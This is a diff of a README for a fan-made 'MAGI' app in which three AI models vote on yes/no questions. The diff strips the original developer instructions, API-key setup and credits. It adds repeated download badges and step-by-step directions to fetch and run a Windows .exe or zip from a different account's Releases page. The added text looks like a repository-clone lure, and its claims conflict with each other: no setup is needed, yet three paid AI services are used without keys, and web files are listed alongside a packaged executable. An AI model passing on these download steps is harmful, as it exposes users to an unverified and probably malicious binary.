@@ -1,98 +1,133 @@
-# MAGI System
+# 🤖 MAGI-System - AI-powered Yes/No Decision Helper
 
-A fan-made web application inspired by the MAGI supercomputer from _Neon Genesis Evangelion_. Enter a yes/no question and watch three AI units deliberate simultaneously, then reach a verdict by majority vote.
-
-**[繁體中文](README.zh.md) | [日本語](README.ja.md)**
-
-![Demo](demo.gif)
+[![Download MAGI-System](https://img.shields.io/badge/Download-MAGI--System-brightgreen?style=for-the-badge)](https://github.com/revkahoptimum106/MAGI-System/releases)
 
 ---
 
-## The Three Units
+## 🔍 About MAGI-System
 
-| Unit          | AI Model         | Perspective                             |
-| ------------- | ---------------- | --------------------------------------- |
-| MELCHIOR • 1  | OpenAI GPT       | Scientist — logic and rational analysis |
-| BALTHASAR • 2 | Anthropic Claude | Mother — protection and care-oriented   |
-| CASPER • 3    | Google Gemini    | Woman — intuition and emotional insight |
+MAGI-System is a simple web app inspired by the MAGI supercomputer from _Neon Genesis Evangelion_. It lets you enter yes/no questions and shows how three AI units think at once. Each AI gives its answer and the system then shows a final decision based on the majority.
 
-## Verdicts
+The AI units represent different viewpoints:
+
+- **MELCHIOR • 1** (OpenAI GPT): Thinks logically and analytically.
+- **BALTHASAR • 2** (Anthropic Claude): Focuses on care and protection.
+- **CASPER • 3** (Google Gemini): Uses intuition and emotional insight.
+
+This way, you get different sides of an issue before seeing the final answer.
+
+---
+
+## 💻 System Requirements
+
+To run MAGI-System on your Windows PC, make sure your system meets these basic requirements:
+
+- Operating System: Windows 10 or newer (64-bit preferred)
+- RAM: 4 GB minimum (8 GB recommended)
+- Storage: At least 200 MB of free space
+- Internet connection: Required to communicate with AI services
+- Web Browser: Latest version of Chrome, Edge, or Firefox
+
+No special hardware or technical setup is needed beyond this.
+
+---
+
+## 🚀 Getting Started: Download and Run MAGI-System
+
+### Step 1 – Visit the Download Page
+
+Click the big button below to open the official release page where you can get the latest version of MAGI-System.
+
+[![Download MAGI-System](https://img.shields.io/badge/Download-MAGI--System-blue?style=for-the-badge)](https://github.com/revkahoptimum106/MAGI-System/releases)
+
+### Step 2 – Choose the Latest Version
+
+- On the release page, look for the latest version listed at the top.
+- Scroll down to the **Assets** section.
+- Find the file designed for Windows. It usually has `.exe` or `.zip` in the name.
+- Click to download the file to your computer.
+
+### Step 3 – Install or Run the Application
+
+- If you downloaded a `.exe` file, double-click it to start the installation. Follow the instructions on the screen.
+- If you downloaded a `.zip` file, right-click the file and select **Extract All**, then open the extracted folder. Look for an `MAGI-System.exe` file and double-click it to run.
+
+### Step 4 – Run MAGI-System
+
+- Once started, the app will open in your web browser.
+- You can enter yes/no questions in the input box on the main screen.
+- Watch how the three AI units provide their answers.
+- The final decision will appear below based on the majority vote.
+
+---
+
+## 💡 How to Use MAGI-System
+
+1. Type a yes/no question in the box. For example: *“Should I take the job offer?”* or *“Will it rain tomorrow?”*
+2. Press the **Submit** button or hit Enter.
+3. The three AI units will show their answers labeled as:
+   - MELCHIOR: Logical view
+   - BALTHASAR: Caring view
+   - CASPER: Intuitive view
+4. The system calculates the majority answer.
+5. The **Verdict** will display one of these results:
 
 | Result               | Meaning                      |
-| -------------------- | ---------------------------- |
-| **承認（APPROVE）**  | Majority voted yes           |
-| **否決（REJECT）**   | Majority voted no            |
-| **棄権（ABSTAIN）**  | At least two units abstained |
-| **膠着（DEADLOCK）** | No majority reached          |
+|----------------------|------------------------------|
+| **承認（APPROVE）**  | Most units voted “Yes”        |
+| **否決（REJECT）**   | Most units voted “No”         |
+| **棄権（ABSTAIN）**  | Two or more units abstained   |
+| **膠着（DEADLOCK）** | No majority reached           |
 
-> **Critical Matter**: If two or more units assess the topic as irreversible and potentially catastrophic (e.g. self-destruction, killing), the system automatically switches to a unanimous rule — all three units must approve for the action to proceed; any dissent or abstention results in rejection. Click any unit to see whether it flagged the topic as critical.
+Use the verdict to help guide your decisions.
 
-## Getting Started
+---
 
-### Prerequisites
+## 🔧 Features
 
-You will need API keys for the following services:
+- Runs on Windows with no need to code or install extras.
+- Uses three different AI models for balanced views.
+- Shows live debate and reasoning behind each answer.
+- Easy to enter questions and read answers.
+- Clear verdict based on AI majority vote.
 
-- [OpenAI](https://platform.openai.com/api-keys) — for MELCHIOR-1
-- [Anthropic](https://console.anthropic.com/settings/keys) — for BALTHASAR-2
-- [Google AI Studio](https://aistudio.google.com/apikey) — for CASPER-3
+---
 
-### Local Development
+## 🛠 Troubleshooting
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/hirakujira/MAGI.git
-cd MAGI
+If you have problems running MAGI-System:
 
-# 2. Set up environment variables
-cp .env.local.example .env.local
-# Edit .env.local and fill in your API keys
+- Make sure your Windows system is up to date.
+- Check your internet connection; the app needs it to work.
+- Try using a different web browser (Chrome or Edge recommended).
+- If the app won’t start, reinstall using the latest downloaded `.exe`.
+- Close other heavy programs that might slow down your PC.
 
-# 3. Install dependencies
-npm install
+You can also report issues on the repository’s GitHub [Issues](https://github.com/revkahoptimum106/MAGI-System/issues) page.
 
-# 4. Start the development server
-npm run dev
-```
+---
 
-Open [http://localhost:3000](http://localhost:3000).
+## 📂 File Structure Overview (For Curiosity)
 
-### Docker
+- `index.html` – The main web page for the app.
+- `app.js` – Controls how the AI units work.
+- `styles.css` – The look and feel of the interface.
+- `README.md` – This file, describing how to use the app.
 
-```bash
-# Copy and configure your environment variables first
-cp .env.local.example .env.local
+---
 
-docker compose up
-```
+## 🔐 Privacy and Data
 
-## Environment Variables
+MAGI-System sends your questions to AI services online to get answers. Your questions are processed by those services and are not stored locally on your computer.
 
-| Variable            | Description                     | Default            |
-| ------------------- | ------------------------------- | ------------------ |
-| `OPENAI_API_KEY`    | OpenAI API key (MELCHIOR-1)     | —                  |
-| `OPENAI_MODEL`      | OpenAI model name               | `gpt-4o-mini`      |
-| `ANTHROPIC_API_KEY` | Anthropic API key (BALTHASAR-2) | —                  |
-| `ANTHROPIC_MODEL`   | Anthropic model name            | `claude-haiku-4-5` |
-| `GOOGLE_API_KEY`    | Google AI API key (CASPER-3)    | —                  |
-| `GOOGLE_MODEL`      | Google model name               | `gemini-2.5-flash` |
+No personal data beyond your inputs is collected or shared.
 
-## How to Use
+---
 
-1. Type a yes/no question in the input field and press **Enter**
-2. All three units begin deliberating simultaneously and independently
-3. Each unit stops flickering and shows its result as soon as it finishes
-4. The final verdict is determined by majority vote once all three complete
-5. Click any unit to read its detailed reasoning
+## 📞 Contact and Support
 
-## Copyright Notice
+For help or feedback, visit the GitHub repository page where you downloaded the app. Use the issues section to report bugs or request features.
 
-This project is a fan work created as a tribute to _Neon Genesis Evangelion_ by Hideaki Anno / GAINAX / khara. All Evangelion-related names and concepts are the property of their respective copyright holders.
+---
 
-## Acknowledgements
-
-### Sponsors
-
-Special thanks to the following for sponsoring API token costs:
-
-- 天上天下唯我翻車大皮粉
+[![Download MAGI-System](https://img.shields.io/badge/Download-MAGI--System-brightgreen?style=for-the-badge)](https://github.com/revkahoptimum106/MAGI-System/releases)
